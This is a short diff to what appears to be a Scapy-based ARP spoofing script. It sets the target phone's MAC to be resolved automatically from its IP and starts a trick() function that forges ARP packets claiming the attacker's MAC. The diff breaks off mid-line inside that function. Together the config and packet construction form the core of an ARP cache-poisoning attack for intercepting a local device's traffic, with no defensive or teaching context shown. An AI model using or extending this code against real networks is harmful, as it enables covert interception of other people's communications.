@@ -23,8 +23,11 @@ Config = {
 	"gate_mac" : "28:6c:07:eb:bd:5c",
 	"phone_ip" : "192.168.31.102",
 	# "phone_mac" : getmacbyip("192.168.31.102")
-	"phone_mac" : "1c:9e:46:ef:e2:a7"
+	# "phone_mac" : "1c:9e:46:ef:e2:a7"
+	"phone_mac" : ""
 }
+
+Config['phone_mac'] = getmacbyip(Config["phone_ip"])
 
 def trick():
 	pk = Ether(src=Config["my_mac"], dst=Config["phone_mac"]) / ARP(hwsrc=Config["my_mac"], 
